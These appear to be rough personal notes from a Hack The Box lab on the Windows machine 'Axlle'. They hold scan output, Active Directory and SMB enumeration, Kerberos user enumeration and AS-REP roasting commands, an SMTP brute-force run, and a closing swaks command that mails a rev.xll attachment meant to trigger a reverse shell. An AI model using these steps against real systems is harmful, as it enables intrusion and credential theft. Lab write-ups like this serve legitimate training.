## Windows Machine - Axile

- [+]:	TargetIP
  >>	10.10.11.21
- [+]:	
  >>	
- [+]:	
  >>	
- [+]:	
  >>	
- [+]:	25/tcp open  smtp    hMailServer smtpd
| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
  >>	
- [+]:	389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)

  >>	
- [+]:	88/tcp open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-06-23 01:26:52Z)
  >>	

sudo ldapsearch -H ldap://10.10.11.21 -x -b "DC=htb,DC=axile" '{}' | cut -d ' ' -f 2 | sort | uniq | cut -d ',' -f 1 > ~/Desktop/HackingLab/HackTheBox/Machines/Forest/Reports/new_users.txt 


   kerbrute userenum -d axlle.htb --dc axlle.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 
   
   impacket-GetNPUsers axlle.htb/ -usersfile users.txt -format hashcat -outputfile
## Recon
´´´
PORT      STATE SERVICE
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49668/tcp open  unknown
60061/tcp open  unknown
60062/tcp open  unknown
60068/tcp open  unknown
60082/tcp open  unknown
61713/tcp open  unknown

´´´



smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 10.10.11.21

PORT     STATE SERVICE       VERSION
25/tcp   open  tcpwrapped
|_smtp-commands: Couldn't establish connection on port 25
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Axlle Development
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-23 01:51:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=MAINFRAME.axlle.htb
| Not valid before: 2024-05-19T11:25:03
|_Not valid after:  2024-11-18T11:25:03
| rdp-ntlm-info: 
|   Target_Name: AXLLE
|   NetBIOS_Domain_Name: AXLLE
|   NetBIOS_Computer_Name: MAINFRAME
|   DNS_Domain_Name: axlle.htb
|   DNS_Computer_Name: MAINFRAME.axlle.htb
|   DNS_Tree_Name: axlle.htb
|   Product_Version: 10.0.20348
|_  System_Time: 2024-06-23T01:51:58+00:00
|_ssl-date: 2024-06-23T01:52:38+00:00; +1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: MAINFRAME; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-06-23T01:51:58
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.95 seconds



cme smb 10.10.11.21 -u '' -p '' --shares
SMB         10.10.11.21     445    MAINFRAME        [*] Windows 10.0 Build 20348 x64 (name:MAINFRAME) (domain:axlle.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.21     445    MAINFRAME        [+] axlle.htb\: 
SMB         10.10.11.21     445    MAINFRAME        [-] Error enumerating shares: STATUS_ACCESS_DENIED


smbclient -L 10.10.11.21
Password for [WORKGROUP\parrot]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.21 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
┌─[parrot@parrot]─[~]
└──╼ $smbclient -m SMB2 -L 10.10.11.21

Password for [WORKGROUP\parrot]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.21 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available



nmap --script=smtp* -p25 10.10.11.21 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-23 02:45 BST
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 11.11% done; ETC: 02:46 (0:00:08 remaining)
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 11.11% done; ETC: 02:46 (0:00:08 remaining)
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 33.33% done; ETC: 02:46 (0:00:02 remaining)
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 28.57% done; ETC: 02:46 (0:00:05 remaining)
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 28.57% done; ETC: 02:46 (0:00:05 remaining)
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 35.71% done; ETC: 02:46 (0:00:04 remaining)
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 35.71% done; ETC: 02:46 (0:00:04 remaining)
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 35.71% done; ETC: 02:46 (0:00:04 remaining)
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 35.71% done; ETC: 02:46 (0:00:05 remaining)
Stats: 0:03:30 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 27.59% done; ETC: 02:58 (0:09:11 remaining)
Stats: 0:03:30 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 27.59% done; ETC: 02:58 (0:09:14 remaining)
Stats: 0:03:30 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 27.59% done; ETC: 02:58 (0:09:14 remaining)
Stats: 0:05:50 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 27.59% done; ETC: 03:07 (0:15:21 remaining)
Stats: 0:05:50 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 27.59% done; ETC: 03:07 (0:15:21 remaining)
Stats: 0:05:50 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 27.59% done; ETC: 03:07 (0:15:21 remaining)
Stats: 0:05:51 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 27.59% done; ETC: 03:07 (0:15:21 remaining)
Stats: 0:55:10 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 27.59% done; ETC: 06:06 (2:24:51 remaining)
NSE: [smtp-brute] usernames: Time limit 10m00s exceeded.
NSE: [smtp-brute] usernames: Time limit 10m00s exceeded.
NSE: [smtp-brute] passwords: Time limit 10m00s exceeded.
Nmap scan report for axile.htb (10.10.11.21)
Host is up (0.14s latency).

PORT   STATE SERVICE
25/tcp open  smtp
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
| smtp-enum-users: 
|   root
|   admin
|   administrator
|   webadmin
|   sysadmin
|   netadmin
|   guest
|   user
|   web
|_  test
| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| smtp-brute: 
|   Accounts: No valid accounts found
|_  Statistics: Performed 27925 guesses in 3666 seconds, average tps: 7.2
|_smtp-open-relay: Server is an open relay (8/16 tests)


swaks from to accounts maybe can proc some revshell in data or attacj file

swaks --to accounts@axlle.htb --from accounts@axlle.htb --attach @/home/parrot/Desktop/HackingLab/HackTheBox/Machines/Axlle/rev.xll --header "Subject: Test Email" --body "Testing email to $user"
